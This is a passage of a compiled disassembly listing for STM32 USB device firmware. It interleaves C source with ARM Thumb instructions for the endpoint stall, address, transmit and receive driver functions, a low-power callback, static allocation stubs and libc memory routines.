  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccd0:	2300      	movs	r3, #0
 800ccd2:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ccd4:	2300      	movs	r3, #0
 800ccd6:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800ccd8:	687b      	ldr	r3, [r7, #4]
 800ccda:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ccde:	78fa      	ldrb	r2, [r7, #3]
 800cce0:	4611      	mov	r1, r2
 800cce2:	4618      	mov	r0, r3
 800cce4:	f7f5 fb7c 	bl	80023e0 <HAL_PCD_EP_SetStall>
 800cce8:	4603      	mov	r3, r0
 800ccea:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ccec:	7bbb      	ldrb	r3, [r7, #14]
 800ccee:	2b03      	cmp	r3, #3
 800ccf0:	d816      	bhi.n	800cd20 <USBD_LL_StallEP+0x5c>
 800ccf2:	a201      	add	r2, pc, #4	; (adr r2, 800ccf8 <USBD_LL_StallEP+0x34>)
 800ccf4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ccf8:	0800cd09 	.word	0x0800cd09
 800ccfc:	0800cd0f 	.word	0x0800cd0f
 800cd00:	0800cd15 	.word	0x0800cd15
 800cd04:	0800cd1b 	.word	0x0800cd1b
    case HAL_OK :
      usb_status = USBD_OK;
 800cd08:	2300      	movs	r3, #0
 800cd0a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd0c:	e00b      	b.n	800cd26 <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd0e:	2303      	movs	r3, #3
 800cd10:	73fb      	strb	r3, [r7, #15]
    break;
 800cd12:	e008      	b.n	800cd26 <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd14:	2301      	movs	r3, #1
 800cd16:	73fb      	strb	r3, [r7, #15]
    break;
 800cd18:	e005      	b.n	800cd26 <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd1a:	2303      	movs	r3, #3
 800cd1c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd1e:	e002      	b.n	800cd26 <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd20:	2303      	movs	r3, #3
 800cd22:	73fb      	strb	r3, [r7, #15]
    break;
 800cd24:	bf00      	nop
  }
  return usb_status;
 800cd26:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd28:	4618      	mov	r0, r3
 800cd2a:	3710      	adds	r7, #16
 800cd2c:	46bd      	mov	sp, r7
 800cd2e:	bd80      	pop	{r7, pc}

0800cd30 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd30:	b580      	push	{r7, lr}
 800cd32:	b084      	sub	sp, #16
 800cd34:	af00      	add	r7, sp, #0
 800cd36:	6078      	str	r0, [r7, #4]
 800cd38:	460b      	mov	r3, r1
 800cd3a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd3c:	2300      	movs	r3, #0
 800cd3e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd40:	2300      	movs	r3, #0
 800cd42:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cd44:	687b      	ldr	r3, [r7, #4]
 800cd46:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd4a:	78fa      	ldrb	r2, [r7, #3]
 800cd4c:	4611      	mov	r1, r2
 800cd4e:	4618      	mov	r0, r3
 800cd50:	f7f5 fba6 	bl	80024a0 <HAL_PCD_EP_ClrStall>
 800cd54:	4603      	mov	r3, r0
 800cd56:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd58:	7bbb      	ldrb	r3, [r7, #14]
 800cd5a:	2b03      	cmp	r3, #3
 800cd5c:	d816      	bhi.n	800cd8c <USBD_LL_ClearStallEP+0x5c>
 800cd5e:	a201      	add	r2, pc, #4	; (adr r2, 800cd64 <USBD_LL_ClearStallEP+0x34>)
 800cd60:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd64:	0800cd75 	.word	0x0800cd75
 800cd68:	0800cd7b 	.word	0x0800cd7b
 800cd6c:	0800cd81 	.word	0x0800cd81
 800cd70:	0800cd87 	.word	0x0800cd87
    case HAL_OK :
      usb_status = USBD_OK;
 800cd74:	2300      	movs	r3, #0
 800cd76:	73fb      	strb	r3, [r7, #15]
    break;
 800cd78:	e00b      	b.n	800cd92 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd7a:	2303      	movs	r3, #3
 800cd7c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd7e:	e008      	b.n	800cd92 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd80:	2301      	movs	r3, #1
 800cd82:	73fb      	strb	r3, [r7, #15]
    break;
 800cd84:	e005      	b.n	800cd92 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd86:	2303      	movs	r3, #3
 800cd88:	73fb      	strb	r3, [r7, #15]
    break;
 800cd8a:	e002      	b.n	800cd92 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd8c:	2303      	movs	r3, #3
 800cd8e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd90:	bf00      	nop
  }
  return usb_status;
 800cd92:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd94:	4618      	mov	r0, r3
 800cd96:	3710      	adds	r7, #16
 800cd98:	46bd      	mov	sp, r7
 800cd9a:	bd80      	pop	{r7, pc}

0800cd9c <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd9c:	b480      	push	{r7}
 800cd9e:	b085      	sub	sp, #20
 800cda0:	af00      	add	r7, sp, #0
 800cda2:	6078      	str	r0, [r7, #4]
 800cda4:	460b      	mov	r3, r1
 800cda6:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cda8:	687b      	ldr	r3, [r7, #4]
 800cdaa:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdae:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cdb0:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cdb4:	2b00      	cmp	r3, #0
 800cdb6:	da0c      	bge.n	800cdd2 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cdb8:	78fb      	ldrb	r3, [r7, #3]
 800cdba:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cdbe:	68f9      	ldr	r1, [r7, #12]
 800cdc0:	1c5a      	adds	r2, r3, #1
 800cdc2:	4613      	mov	r3, r2
 800cdc4:	009b      	lsls	r3, r3, #2
 800cdc6:	4413      	add	r3, r2
 800cdc8:	00db      	lsls	r3, r3, #3
 800cdca:	440b      	add	r3, r1
 800cdcc:	3302      	adds	r3, #2
 800cdce:	781b      	ldrb	r3, [r3, #0]
 800cdd0:	e00b      	b.n	800cdea <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cdd2:	78fb      	ldrb	r3, [r7, #3]
 800cdd4:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cdd8:	68f9      	ldr	r1, [r7, #12]
 800cdda:	4613      	mov	r3, r2
 800cddc:	009b      	lsls	r3, r3, #2
 800cdde:	4413      	add	r3, r2
 800cde0:	00db      	lsls	r3, r3, #3
 800cde2:	440b      	add	r3, r1
 800cde4:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cde8:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cdea:	4618      	mov	r0, r3
 800cdec:	3714      	adds	r7, #20
 800cdee:	46bd      	mov	sp, r7
 800cdf0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cdf4:	4770      	bx	lr
	...

0800cdf8 <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cdf8:	b580      	push	{r7, lr}
 800cdfa:	b084      	sub	sp, #16
 800cdfc:	af00      	add	r7, sp, #0
 800cdfe:	6078      	str	r0, [r7, #4]
 800ce00:	460b      	mov	r3, r1
 800ce02:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce04:	2300      	movs	r3, #0
 800ce06:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce08:	2300      	movs	r3, #0
 800ce0a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800ce0c:	687b      	ldr	r3, [r7, #4]
 800ce0e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce12:	78fa      	ldrb	r2, [r7, #3]
 800ce14:	4611      	mov	r1, r2
 800ce16:	4618      	mov	r0, r3
 800ce18:	f7f5 f97f 	bl	800211a <HAL_PCD_SetAddress>
 800ce1c:	4603      	mov	r3, r0
 800ce1e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce20:	7bbb      	ldrb	r3, [r7, #14]
 800ce22:	2b03      	cmp	r3, #3
 800ce24:	d816      	bhi.n	800ce54 <USBD_LL_SetUSBAddress+0x5c>
 800ce26:	a201      	add	r2, pc, #4	; (adr r2, 800ce2c <USBD_LL_SetUSBAddress+0x34>)
 800ce28:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce2c:	0800ce3d 	.word	0x0800ce3d
 800ce30:	0800ce43 	.word	0x0800ce43
 800ce34:	0800ce49 	.word	0x0800ce49
 800ce38:	0800ce4f 	.word	0x0800ce4f
    case HAL_OK :
      usb_status = USBD_OK;
 800ce3c:	2300      	movs	r3, #0
 800ce3e:	73fb      	strb	r3, [r7, #15]
    break;
 800ce40:	e00b      	b.n	800ce5a <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce42:	2303      	movs	r3, #3
 800ce44:	73fb      	strb	r3, [r7, #15]
    break;
 800ce46:	e008      	b.n	800ce5a <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce48:	2301      	movs	r3, #1
 800ce4a:	73fb      	strb	r3, [r7, #15]
    break;
 800ce4c:	e005      	b.n	800ce5a <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce4e:	2303      	movs	r3, #3
 800ce50:	73fb      	strb	r3, [r7, #15]
    break;
 800ce52:	e002      	b.n	800ce5a <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce54:	2303      	movs	r3, #3
 800ce56:	73fb      	strb	r3, [r7, #15]
    break;
 800ce58:	bf00      	nop
  }
  return usb_status;
 800ce5a:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce5c:	4618      	mov	r0, r3
 800ce5e:	3710      	adds	r7, #16
 800ce60:	46bd      	mov	sp, r7
 800ce62:	bd80      	pop	{r7, pc}

0800ce64 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce64:	b580      	push	{r7, lr}
 800ce66:	b086      	sub	sp, #24
 800ce68:	af00      	add	r7, sp, #0
 800ce6a:	60f8      	str	r0, [r7, #12]
 800ce6c:	607a      	str	r2, [r7, #4]
 800ce6e:	603b      	str	r3, [r7, #0]
 800ce70:	460b      	mov	r3, r1
 800ce72:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce74:	2300      	movs	r3, #0
 800ce76:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce78:	2300      	movs	r3, #0
 800ce7a:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800ce7c:	68fb      	ldr	r3, [r7, #12]
 800ce7e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce82:	7af9      	ldrb	r1, [r7, #11]
 800ce84:	683b      	ldr	r3, [r7, #0]
 800ce86:	687a      	ldr	r2, [r7, #4]
 800ce88:	f7f5 fa5a 	bl	8002340 <HAL_PCD_EP_Transmit>
 800ce8c:	4603      	mov	r3, r0
 800ce8e:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce90:	7dbb      	ldrb	r3, [r7, #22]
 800ce92:	2b03      	cmp	r3, #3
 800ce94:	d816      	bhi.n	800cec4 <USBD_LL_Transmit+0x60>
 800ce96:	a201      	add	r2, pc, #4	; (adr r2, 800ce9c <USBD_LL_Transmit+0x38>)
 800ce98:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce9c:	0800cead 	.word	0x0800cead
 800cea0:	0800ceb3 	.word	0x0800ceb3
 800cea4:	0800ceb9 	.word	0x0800ceb9
 800cea8:	0800cebf 	.word	0x0800cebf
    case HAL_OK :
      usb_status = USBD_OK;
 800ceac:	2300      	movs	r3, #0
 800ceae:	75fb      	strb	r3, [r7, #23]
    break;
 800ceb0:	e00b      	b.n	800ceca <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ceb2:	2303      	movs	r3, #3
 800ceb4:	75fb      	strb	r3, [r7, #23]
    break;
 800ceb6:	e008      	b.n	800ceca <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ceb8:	2301      	movs	r3, #1
 800ceba:	75fb      	strb	r3, [r7, #23]
    break;
 800cebc:	e005      	b.n	800ceca <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cebe:	2303      	movs	r3, #3
 800cec0:	75fb      	strb	r3, [r7, #23]
    break;
 800cec2:	e002      	b.n	800ceca <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800cec4:	2303      	movs	r3, #3
 800cec6:	75fb      	strb	r3, [r7, #23]
    break;
 800cec8:	bf00      	nop
  }
  return usb_status;
 800ceca:	7dfb      	ldrb	r3, [r7, #23]
}
 800cecc:	4618      	mov	r0, r3
 800cece:	3718      	adds	r7, #24
 800ced0:	46bd      	mov	sp, r7
 800ced2:	bd80      	pop	{r7, pc}

0800ced4 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ced4:	b580      	push	{r7, lr}
 800ced6:	b086      	sub	sp, #24
 800ced8:	af00      	add	r7, sp, #0
 800ceda:	60f8      	str	r0, [r7, #12]
 800cedc:	607a      	str	r2, [r7, #4]
 800cede:	603b      	str	r3, [r7, #0]
 800cee0:	460b      	mov	r3, r1
 800cee2:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cee4:	2300      	movs	r3, #0
 800cee6:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cee8:	2300      	movs	r3, #0
 800ceea:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800ceec:	68fb      	ldr	r3, [r7, #12]
 800ceee:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cef2:	7af9      	ldrb	r1, [r7, #11]
 800cef4:	683b      	ldr	r3, [r7, #0]
 800cef6:	687a      	ldr	r2, [r7, #4]
 800cef8:	f7f5 f9d9 	bl	80022ae <HAL_PCD_EP_Receive>
 800cefc:	4603      	mov	r3, r0
 800cefe:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cf00:	7dbb      	ldrb	r3, [r7, #22]
 800cf02:	2b03      	cmp	r3, #3
 800cf04:	d816      	bhi.n	800cf34 <USBD_LL_PrepareReceive+0x60>
 800cf06:	a201      	add	r2, pc, #4	; (adr r2, 800cf0c <USBD_LL_PrepareReceive+0x38>)
 800cf08:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cf0c:	0800cf1d 	.word	0x0800cf1d
 800cf10:	0800cf23 	.word	0x0800cf23
 800cf14:	0800cf29 	.word	0x0800cf29
 800cf18:	0800cf2f 	.word	0x0800cf2f
    case HAL_OK :
      usb_status = USBD_OK;
 800cf1c:	2300      	movs	r3, #0
 800cf1e:	75fb      	strb	r3, [r7, #23]
    break;
 800cf20:	e00b      	b.n	800cf3a <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cf22:	2303      	movs	r3, #3
 800cf24:	75fb      	strb	r3, [r7, #23]
    break;
 800cf26:	e008      	b.n	800cf3a <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cf28:	2301      	movs	r3, #1
 800cf2a:	75fb      	strb	r3, [r7, #23]
    break;
 800cf2c:	e005      	b.n	800cf3a <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cf2e:	2303      	movs	r3, #3
 800cf30:	75fb      	strb	r3, [r7, #23]
    break;
 800cf32:	e002      	b.n	800cf3a <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800cf34:	2303      	movs	r3, #3
 800cf36:	75fb      	strb	r3, [r7, #23]
    break;
 800cf38:	bf00      	nop
  }
  return usb_status;
 800cf3a:	7dfb      	ldrb	r3, [r7, #23]
}
 800cf3c:	4618      	mov	r0, r3
 800cf3e:	3718      	adds	r7, #24
 800cf40:	46bd      	mov	sp, r7
 800cf42:	bd80      	pop	{r7, pc}

0800cf44 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf44:	b580      	push	{r7, lr}
 800cf46:	b082      	sub	sp, #8
 800cf48:	af00      	add	r7, sp, #0
 800cf4a:	6078      	str	r0, [r7, #4]
 800cf4c:	460b      	mov	r3, r1
 800cf4e:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800cf50:	687b      	ldr	r3, [r7, #4]
 800cf52:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf56:	78fa      	ldrb	r2, [r7, #3]
 800cf58:	4611      	mov	r1, r2
 800cf5a:	4618      	mov	r0, r3
 800cf5c:	f7f5 f9d8 	bl	8002310 <HAL_PCD_EP_GetRxCount>
 800cf60:	4603      	mov	r3, r0
}
 800cf62:	4618      	mov	r0, r3
 800cf64:	3708      	adds	r7, #8
 800cf66:	46bd      	mov	sp, r7
 800cf68:	bd80      	pop	{r7, pc}
	...

0800cf6c <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800cf6c:	b580      	push	{r7, lr}
 800cf6e:	b082      	sub	sp, #8
 800cf70:	af00      	add	r7, sp, #0
 800cf72:	6078      	str	r0, [r7, #4]
 800cf74:	460b      	mov	r3, r1
 800cf76:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800cf78:	78fb      	ldrb	r3, [r7, #3]
 800cf7a:	2b00      	cmp	r3, #0
 800cf7c:	d002      	beq.n	800cf84 <HAL_PCDEx_LPM_Callback+0x18>
 800cf7e:	2b01      	cmp	r3, #1
 800cf80:	d013      	beq.n	800cfaa <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800cf82:	e023      	b.n	800cfcc <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800cf84:	687b      	ldr	r3, [r7, #4]
 800cf86:	699b      	ldr	r3, [r3, #24]
 800cf88:	2b00      	cmp	r3, #0
 800cf8a:	d007      	beq.n	800cf9c <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800cf8c:	f000 f84a 	bl	800d024 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf90:	4b10      	ldr	r3, [pc, #64]	; (800cfd4 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf92:	691b      	ldr	r3, [r3, #16]
 800cf94:	4a0f      	ldr	r2, [pc, #60]	; (800cfd4 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf96:	f023 0306 	bic.w	r3, r3, #6
 800cf9a:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800cf9c:	687b      	ldr	r3, [r7, #4]
 800cf9e:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cfa2:	4618      	mov	r0, r3
 800cfa4:	f7fe fa66 	bl	800b474 <USBD_LL_Resume>
    break;
 800cfa8:	e010      	b.n	800cfcc <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800cfaa:	687b      	ldr	r3, [r7, #4]
 800cfac:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cfb0:	4618      	mov	r0, r3
 800cfb2:	f7fe fa43 	bl	800b43c <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800cfb6:	687b      	ldr	r3, [r7, #4]
 800cfb8:	699b      	ldr	r3, [r3, #24]
 800cfba:	2b00      	cmp	r3, #0
 800cfbc:	d005      	beq.n	800cfca <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cfbe:	4b05      	ldr	r3, [pc, #20]	; (800cfd4 <HAL_PCDEx_LPM_Callback+0x68>)
 800cfc0:	691b      	ldr	r3, [r3, #16]
 800cfc2:	4a04      	ldr	r2, [pc, #16]	; (800cfd4 <HAL_PCDEx_LPM_Callback+0x68>)
 800cfc4:	f043 0306 	orr.w	r3, r3, #6
 800cfc8:	6113      	str	r3, [r2, #16]
    break;
 800cfca:	bf00      	nop
}
 800cfcc:	bf00      	nop
 800cfce:	3708      	adds	r7, #8
 800cfd0:	46bd      	mov	sp, r7
 800cfd2:	bd80      	pop	{r7, pc}
 800cfd4:	e000ed00 	.word	0xe000ed00

0800cfd8 <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cfd8:	b480      	push	{r7}
 800cfda:	b083      	sub	sp, #12
 800cfdc:	af00      	add	r7, sp, #0
 800cfde:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cfe0:	4b03      	ldr	r3, [pc, #12]	; (800cff0 <USBD_static_malloc+0x18>)
}
 800cfe2:	4618      	mov	r0, r3
 800cfe4:	370c      	adds	r7, #12
 800cfe6:	46bd      	mov	sp, r7
 800cfe8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfec:	4770      	bx	lr
 800cfee:	bf00      	nop
 800cff0:	20000e74 	.word	0x20000e74

0800cff4 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cff4:	b480      	push	{r7}
 800cff6:	b083      	sub	sp, #12
 800cff8:	af00      	add	r7, sp, #0
 800cffa:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cffc:	4b03      	ldr	r3, [pc, #12]	; (800d00c <USBD_static_malloc_MSC+0x18>)
}
 800cffe:	4618      	mov	r0, r3
 800d000:	370c      	adds	r7, #12
 800d002:	46bd      	mov	sp, r7
 800d004:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d008:	4770      	bx	lr
 800d00a:	bf00      	nop
 800d00c:	20000e9c 	.word	0x20000e9c

0800d010 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800d010:	b480      	push	{r7}
 800d012:	b083      	sub	sp, #12
 800d014:	af00      	add	r7, sp, #0
 800d016:	6078      	str	r0, [r7, #4]

}
 800d018:	bf00      	nop
 800d01a:	370c      	adds	r7, #12
 800d01c:	46bd      	mov	sp, r7
 800d01e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d022:	4770      	bx	lr

0800d024 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800d024:	b580      	push	{r7, lr}
 800d026:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800d028:	f7f3 fb10 	bl	800064c <SystemClock_Config>
}
 800d02c:	bf00      	nop
 800d02e:	bd80      	pop	{r7, pc}

0800d030 <memset>:
 800d030:	4402      	add	r2, r0
 800d032:	4603      	mov	r3, r0
 800d034:	4293      	cmp	r3, r2
 800d036:	d100      	bne.n	800d03a <memset+0xa>
 800d038:	4770      	bx	lr
 800d03a:	f803 1b01 	strb.w	r1, [r3], #1
 800d03e:	e7f9      	b.n	800d034 <memset+0x4>

0800d040 <__libc_init_array>:
 800d040:	b570      	push	{r4, r5, r6, lr}
 800d042:	4d0d      	ldr	r5, [pc, #52]	; (800d078 <__libc_init_array+0x38>)
 800d044:	4c0d      	ldr	r4, [pc, #52]	; (800d07c <__libc_init_array+0x3c>)
 800d046:	1b64      	subs	r4, r4, r5
 800d048:	10a4      	asrs	r4, r4, #2
 800d04a:	2600      	movs	r6, #0
 800d04c:	42a6      	cmp	r6, r4
 800d04e:	d109      	bne.n	800d064 <__libc_init_array+0x24>
 800d050:	4d0b      	ldr	r5, [pc, #44]	; (800d080 <__libc_init_array+0x40>)
 800d052:	4c0c      	ldr	r4, [pc, #48]	; (800d084 <__libc_init_array+0x44>)
 800d054:	f000 f826 	bl	800d0a4 <_init>
 800d058:	1b64      	subs	r4, r4, r5
 800d05a:	10a4      	asrs	r4, r4, #2
 800d05c:	2600      	movs	r6, #0
 800d05e:	42a6      	cmp	r6, r4
 800d060:	d105      	bne.n	800d06e <__libc_init_array+0x2e>
 800d062:	bd70      	pop	{r4, r5, r6, pc}
 800d064:	f855 3b04 	ldr.w	r3, [r5], #4
 800d068:	4798      	blx	r3
 800d06a:	3601      	adds	r6, #1
 800d06c:	e7ee      	b.n	800d04c <__libc_init_array+0xc>
 800d06e:	f855 3b04 	ldr.w	r3, [r5], #4
 800d072:	4798      	blx	r3
 800d074:	3601      	adds	r6, #1
 800d076:	e7f2      	b.n	800d05e <__libc_init_array+0x1e>
 800d078:	0800d2ec 	.word	0x0800d2ec
 800d07c:	0800d2ec 	.word	0x0800d2ec
 800d080:	0800d2ec 	.word	0x0800d2ec
 800d084:	0800d2f0 	.word	0x0800d2f0

0800d088 <memcpy>:
 800d088:	440a      	add	r2, r1
 800d08a:	4291      	cmp	r1, r2
 800d08c:	f100 33ff 	add.w	r3, r0, #4294967295
 800d090:	d100      	bne.n	800d094 <memcpy+0xc>
 800d092:	4770      	bx	lr
 800d094:	b510      	push	{r4, lr}
 800d096:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d09a:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d09e:	4291      	cmp	r1, r2
 800d0a0:	d1f9      	bne.n	800d096 <memcpy+0xe>
 800d0a2:	bd10      	pop	{r4, pc}

0800d0a4 <_init>:
 800d0a4:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d0a6:	bf00      	nop
 800d0a8:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d0aa:	bc08      	pop	{r3}
 800d0ac:	469e      	mov	lr, r3
 800d0ae:	4770      	bx	lr

0800d0b0 <_fini>:
 800d0b0:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d0b2:	bf00      	nop
 800d0b4:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d0b6:	bc08      	pop	{r3}
 800d0b8:	469e      	mov	lr, r3
